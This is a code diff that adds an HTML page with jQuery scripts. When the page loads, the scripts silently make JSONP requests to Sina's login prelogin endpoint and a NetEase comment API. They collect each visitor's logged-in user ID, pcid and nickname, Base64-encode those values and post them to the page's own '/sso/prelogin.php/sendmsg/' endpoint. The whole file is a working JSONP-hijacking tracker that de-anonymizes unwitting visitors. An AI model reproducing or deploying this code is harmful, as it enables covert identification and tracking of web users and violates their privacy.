@@ -1,0 +1,60 @@
+<meta name="referrer" content="no-referrer" />
+<html>
+<head>
+    <script type="text/javascript" src="static/base64.js"></script>
+    <script type="text/javascript" src="static/jquery.js"></script>
+</head>
+<script type="text/javascript">
+    var test = function (data){}
+    window.onload = function () {
+        sina();
+        netease();
+    };
+
+    function sina() {
+        $.ajax({  
+            type : "get",  
+            url : "https://login.sina.com.cn/sso/prelogin.php?entry=weibo&su=&rsakt=mod&client=ssologin.js(v1.4.19)&callback=?",
+            dataType : "jsonp",
+            jsonp : "callback",
+            jsonpCallback : "test",
+            success : function (data){
+                console.log('success')
+                console.log(data)
+                $.ajax({
+                    type : "post",
+                    headers: {
+                        "Content-Type":"application/json;charset=UTF-8"
+                    },
+                    dataType: "json",
+                    data: Base64.encode(JSON.stringify({"idType":"sina","uid":data.uid,"pcid":data.pcid})),
+                    url: "/sso/prelogin.php/sendmsg/"  
+                })
+            },
+            error : function (){}
+        });
+    };
+
+    function netease() {
+        $.ajax({  
+            type : "get",  
+            url:"http://comment.api.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/users/0/dailyAchv?ibc=newspc&from=all&callback=?", 
+            dataType : "jsonp",
+            jsonp : "callback",
+            jsonpCallback : "callback",
+            success : function (data){  
+                $.ajax({
+                    type : "post",
+                    headers: {
+                        "Content-Type":"application/json;charset=UTF-8"
+                    },
+                    dataType: "json",
+                    data: Base64.encode(JSON.stringify({"idType":"netease","uid":data.user.userId,"nickname":data.user.nickname})),
+                    url: "/sso/prelogin.php/sendmsg/"  
+                })
+            },
+            error : function (){}
+        });
+    };
+</script>
+</html>
